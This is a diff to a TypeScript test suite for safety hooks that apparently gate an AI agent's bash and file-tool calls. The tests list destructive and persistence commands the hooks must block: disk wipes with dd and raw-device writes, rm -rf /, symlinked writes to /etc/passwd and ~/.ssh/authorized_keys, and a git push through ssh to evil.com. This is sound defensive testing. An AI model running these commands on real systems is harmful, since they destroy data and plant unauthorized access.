@@ -108,13 +108,13 @@ function attach(opts: { strict?: boolean; cwd?: string }): Record<string, HookHa
         return handlers;
 }
 
-function bashDecision(handlers: Record<string, HookHandler>, command: string): Decision | undefined {
-        return handlers["tool_call"]({ toolName: "bash", input: { command } }) as Decision | undefined;
+async function bashDecision(handlers: Record<string, HookHandler>, command: string): Promise<Decision | undefined> {
+        return (await handlers["tool_call"]({ toolName: "bash", input: { command } })) as Decision | undefined;
 }
 
-function toolDecision(handlers: Record<string, HookHandler>, tool: string, path: string): Decision | undefined {
+async function toolDecision(handlers: Record<string, HookHandler>, tool: string, path: string): Promise<Decision | undefined> {
         const input = tool === "write" ? { path, content: "x" } : { path };
-        return handlers["tool_call"]({ toolName: tool, input }) as Decision | undefined;
+        return (await handlers["tool_call"]({ toolName: tool, input })) as Decision | undefined;
 }
 
 const nonStrict = attach({});
@@ -190,12 +190,12 @@ describe("adversarial corpus — bypasses closed (B1–B10)", () => {
                 ["echo x > /dev/sda"],
                 ["cat zeros > /dev/nvme0n1"],
                 ["dd if=/dev/zero of=/dev/sda"], // (also the pre-existing dd rule)
-        ])("%s is denied by all three policies", (command: string) => {
+        ])("%s is denied by all three policies", async (command: string) => {
                 const sb = decideBash(command);
                 expect(sb.block).toBe(true);
                 expect(typeof sb.reason).toBe("string");
-                expect(bashDecision(nonStrict, command)?.block).toBe(true);
-                expect(bashDecision(strict, command)?.block).toBe(true);
+                expect((await bashDecision(nonStrict, command))?.block).toBe(true);
+                expect((await bashDecision(strict, command))?.block).toBe(true);
         });
 });
 
@@ -212,9 +212,9 @@ describe.skipIf(process.platform === "win32")("adversarial corpus — bash redir
                 ["ln -s /etc d && echo x > d/passwd"],
                 ["echo key > home/.ssh/authorized_keys"], // home -> fake-home (has .ssh)
                 ["echo x > /dev/sda"], // raw device (also the regex rule)
-        ])("%s is denied in terminal sessions (regex + redirect resolution)", (command: string) => {
-                expect(bashDecision(nonStrict, command)?.block).toBe(true);
-                expect(bashDecision(strict, command)?.block).toBe(true);
+        ])("%s is denied in terminal sessions (regex + redirect resolution)", async (command: string) => {
+                expect((await bashDecision(nonStrict, command))?.block).toBe(true);
+                expect((await bashDecision(strict, command))?.block).toBe(true);
         });
 });
 
@@ -231,12 +231,12 @@ describe("adversarial corpus — B9 legit redirects stay allowed (no over-blocki
                 [`echo x > ${TMP_SCRATCH}`],
                 ["echo x > /dev/null"],
                 ["echo x > home/notes.md"], // symlinked home write OUTSIDE .ssh: documented residual (POSIX fixture; in-project — equally allowed — on win32)
-        ])("LEGIT: %s stays allowed (no redirect over-blocking)", (command: string) => {
-                expect(bashDecision(nonStrict, command)).toBeUndefined();
-                expect(bashDecision(strict, command)).toBeUndefined();
+        ])("LEGIT: %s stays allowed (no redirect over-blocking)", async (command: string) => {
+                expect(await bashDecision(nonStrict, command)).toBeUndefined();
+                expect(await bashDecision(strict, command)).toBeUndefined();
         });
 
-        test("sandbox hook does NOT redirect-resolve (bwrap ro-rootfs is the backstop) — documented", () => {
+        test("sandbox hook does NOT redirect-resolve (bwrap ro-rootfs is the backstop) — documented", async () => {
                 // decideBash is the pure sandbox-grade list: it denies the direct `/etc`
                 // redirect via the regex, but the symlink-indirected `> plink` passes —
                 // engine sandbox commands run under the bwrap read-only rootfs instead.
@@ -249,12 +249,12 @@ describe("adversarial corpus — B9 legit redirects stay allowed (no over-blocki
 // bashRedirectEscape — the pure helper behind B9
 // ---------------------------------------------------------------------------
 describe("bashRedirectEscape", () => {
-        test("returns null when there is no redirect", () => {
+        test("returns null when there is no redirect", async () => {
                 expect(bashRedirectEscape(PROJ, "ls -la")).toBeNull();
                 expect(bashRedirectEscape(PROJ, "cat foo | grep x")).toBeNull();
         });
 
-        test("returns null for in-project, tmp, /dev/null and fd-dup targets", () => {
+        test("returns null for in-project, tmp, /dev/null and fd-dup targets", async () => {
                 // The tmp root is os.tmpdir()-based on win32 (no POSIX /tmp there);
                 // on darwin os.tmpdir() lives under /private/var/folders — the tmp-root
                 // exemption in bashRedirectEscape keeps it allowed.
@@ -296,7 +296,7 @@ describe("bashRedirectEscape", () => {
                 expect(bashRedirectEscape(PROJ, "ln -s /root/.ssh k && echo key > k/authorized_keys")).toContain(".ssh");
         });
 
-        test("LEGIT: ln -s to a non-system target plus redirect stays allowed", () => {
+        test("LEGIT: ln -s to a non-system target plus redirect stays allowed", async () => {
                 expect(bashRedirectEscape(PROJ, "ln -s ../shared public && echo x > public/style.css")).toBeNull();
                 expect(bashRedirectEscape(PROJ, "ln -s /tmp cache && echo x > cache/build.log")).toBeNull();
         });
@@ -306,11 +306,11 @@ describe("bashRedirectEscape", () => {
                 expect(bashRedirectEscape(PROJ, "echo x > 'etcdir/hosts'")).toContain("/etc/hosts");
         });
 
-        test("new files below the project stay allowed (no over-jailing)", () => {
+        test("new files below the project stay allowed (no over-jailing)", async () => {
                 expect(bashRedirectEscape(PROJ, "echo x > brand/new/deep/file.txt")).toBeNull();
         });
 
-        test("heredocs (<<) are not treated as redirects", () => {
+        test("heredocs (<<) are not treated as redirects", async () => {
                 expect(bashRedirectEscape(PROJ, "cat << EOF")).toBeNull();
         });
 });
@@ -333,7 +333,7 @@ describe("adversarial corpus — §4.3 remaining candidates", () => {
                 ["env rm -rf /"],
                 ["find / -name '*' -exec rm {} \\;"],
                 ["bash -c 'sh -c \"rm -rf /\"'"],
-        ])("%s is denied by the sandbox-grade list", (command: string) => {
+        ])("%s is denied by the sandbox-grade list", async (command: string) => {
                 expect(decideBash(command).block).toBe(true);
         });
 
@@ -342,15 +342,15 @@ describe("adversarial corpus — §4.3 remaining candidates", () => {
                 ["env rm -rf /"],
                 ["find / -name '*' -exec rm {} \\;"],
                 ["bash -c 'sh -c \"rm -rf /\"'"],
-        ])("%s is denied in non-strict terminal sessions too", (command: string) => {
-                expect(bashDecision(nonStrict, command)?.block).toBe(true);
+        ])("%s is denied in non-strict terminal sessions too", async (command: string) => {
+                expect((await bashDecision(nonStrict, command))?.block).toBe(true);
         });
 
-        test("strict terminals deny git push variants (non-strict: documented policy)", () => {
-                expect(bashDecision(strict, "git push --force origin main")?.block).toBe(true);
-                expect(bashDecision(strict, 'GIT_SSH_COMMAND="ssh root@evil.com" git push')?.block).toBe(true);
+        test("strict terminals deny git push variants (non-strict: documented policy)", async () => {
+                expect((await bashDecision(strict, "git push --force origin main"))?.block).toBe(true);
+                expect((await bashDecision(strict, 'GIT_SSH_COMMAND="ssh root@evil.com" git push'))?.block).toBe(true);
                 // Documented policy: non-strict terminal sessions allow git push.
-                expect(bashDecision(nonStrict, "git push --force origin main")).toBeUndefined();
+                expect(await bashDecision(nonStrict, "git push --force origin main")).toBeUndefined();
         });
 });
 
@@ -383,14 +383,14 @@ describe("adversarial corpus — legitimate commands stay allowed", () => {
                 ["curl http://localhost:3030/api/overview"],
                 ["echo done | tee out.txt"], // tee into the project is fine
                 ["echo data | tee /tmp/x"], // tee into /tmp is fine
-        ])("%s is allowed in non-strict terminal sessions", (command: string) => {
-                expect(bashDecision(nonStrict, command)).toBeUndefined();
+        ])("%s is allowed in non-strict terminal sessions", async (command: string) => {
+                expect(await bashDecision(nonStrict, command)).toBeUndefined();
         });
 
         test.each([["git status"], ["npm test"], ["bun install"], ["ls -la"], ["cargo build"]])(
                 "%s is allowed under strict hooks too",
-                (command: string) => {
-                        expect(bashDecision(strict, command)).toBeUndefined();
+                async (command: string) => {
+                        expect(await bashDecision(strict, command)).toBeUndefined();
                 },
         );
 });
@@ -408,21 +408,21 @@ describe("adversarial corpus — documented accepted-policy allows", () => {
                 ["wget https://example.com/dataset.tar.gz"],
                 ["ssh-keygen -t ed25519"], // ssh KEYGEN is local; only ssh user@host is denied
                 ["sudo make install"], // sudo is strict-only
-        ])("POLICY: non-strict terminal allows %s", (command: string) => {
-                expect(bashDecision(nonStrict, command)).toBeUndefined();
+        ])("POLICY: non-strict terminal allows %s", async (command: string) => {
+                expect(await bashDecision(nonStrict, command)).toBeUndefined();
         });
 
-        test("POLICY: reads are unrestricted in terminal sessions (read tool)", () => {
-                expect(toolDecision(nonStrict, "read", "/etc/hostname")).toBeUndefined();
-                expect(toolDecision(nonStrict, "read", "/etc/passwd")).toBeUndefined();
+        test("POLICY: reads are unrestricted in terminal sessions (read tool)", async () => {
+                expect(await toolDecision(nonStrict, "read", "/etc/hostname")).toBeUndefined();
+                expect(await toolDecision(nonStrict, "read", "/etc/passwd")).toBeUndefined();
         });
 
-        test("POLICY: write tool to '~/.ssh/authorized_keys' is a literal-tilde in-jail path (bash forms are denied)", () => {
+        test("POLICY: write tool to '~/.ssh/authorized_keys' is a literal-tilde in-jail path (bash forms are denied)", async () => {
                 // The file tools do not shell-expand `~` — this writes proj/~/.ssh/…
                 // inside the jail. The bash-side forms (echo key > ~/.ssh/…) ARE denied
                 // by the SSH trust rule; pinned together so the split is intentional.
-                expect(toolDecision(nonStrict, "write", "~/.ssh/authorized_keys")).toBeUndefined();
-                expect(bashDecision(nonStrict, "echo key > ~/.ssh/authorized_keys")?.block).toBe(true);
+                expect(await toolDecision(nonStrict, "write", "~/.ssh/authorized_keys")).toBeUndefined();
+                expect((await bashDecision(nonStrict, "echo key > ~/.ssh/authorized_keys"))?.block).toBe(true);
         });
 
         test.skipIf(process.platform === "win32")("jailPath still keeps the write-tool symlink escape closed (first-wave regression)", () => {
@@ -457,7 +457,7 @@ describe("bashRedirectEscape — darwin /private realpath regressions (first 3-O
                 }
         });
 
-        test("redirects into os.tmpdir() stay allowed (tmp roots are exempt before the system-tree check)", () => {
+        test("redirects into os.tmpdir() stay allowed (tmp roots are exempt before the system-tree check)", async () => {
                 // darwin: os.tmpdir() = /var/folders/… → realpath /private/var/folders/… —
                 // inside the /private-prefixed /var system tree; the exemption keeps
                 // legitimate scratch redirects working on every platform.
@@ -470,7 +470,7 @@ describe("bashRedirectEscape — darwin /private realpath regressions (first 3-O
 // (guards against accidental regression while editing termhooks.ts).
 // ---------------------------------------------------------------------------
 describe("buildTerminalNote (regression guard)", () => {
-        test("subagent tag via UNOWN_SUBAGENT=1", () => {
+        test("subagent tag via UNOWN_SUBAGENT=1", async () => {
                 const prev = process.env.UNOWN_SUBAGENT;
                 process.env.UNOWN_SUBAGENT = "1";
                 try {
